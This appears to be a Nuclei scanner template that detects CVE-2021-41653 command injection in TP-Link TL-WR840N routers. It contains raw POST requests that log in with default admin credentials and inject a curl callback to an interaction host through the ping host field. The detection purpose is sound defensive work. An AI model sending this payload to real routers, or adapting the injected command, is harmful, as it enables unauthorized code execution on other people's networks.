http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    type: word
    words:
    - 'User-Agent: {{useragent}}'
  matchers-condition: and
  raw:
  - 'POST /cgi?2 HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/plain

    Referer: http://{{Hostname}}/mainFrame.htm

    Cookie: Authorization=Basic YWRtaW46YWRtaW4=


    [IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6

    dataBlockSize=64

    timeout=1

    numberOfRepetitions=4

    host=$(echo 127.0.0.1; curl http://{{interactsh-url}} -H ''User-Agent: {{useragent}}'')

    X_TP_ConnName=ewan_ipoe_d

    diagnosticsState=Requested

    '
  - 'POST /cgi?7 HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/plain

    Referer: http://{{Hostname}}/mainFrame.htm

    Cookie: Authorization=Basic YWRtaW46YWRtaW4=


    [ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0

    '
id: CVE-2021-41653
info:
  author: gy741
  classification:
    cpe: cpe:2.3:o:tp-link:tl-wr840n_firmware:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-41653
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-94
    epss-percentile: 0.99675
    epss-score: 0.91914
  description: The PING function on the TP-Link TL-WR840N EU v5 router with firmware
    through TL-WR840N(EU)_V5_171211 is vulnerable to remote code execution via a specially
    crafted payload in an IP address input field.
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access, data leakage, and potential compromise of the entire network.

    '
  metadata:
    max-request: 2
    product: tl-wr840n_firmware
    vendor: tp-link
  name: TP-Link - OS Command Injection
  reference:
  - https://k4m1ll0.com/cve-2021-41653.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-41653
  - https://www.tp-link.com/us/press/security-advisory/
  - http://tp-link.com
  - https://github.com/ARPSyndicate/cvemon
  remediation: Upgrade the firmware to at least version "TL-WR840N(EU)_V5_211109".
  severity: critical
  tags: cve2021,cve,tplink,rce,router,tp-link,vkev,vuln
variables:
  useragent: '{{rand_base(6)}}'
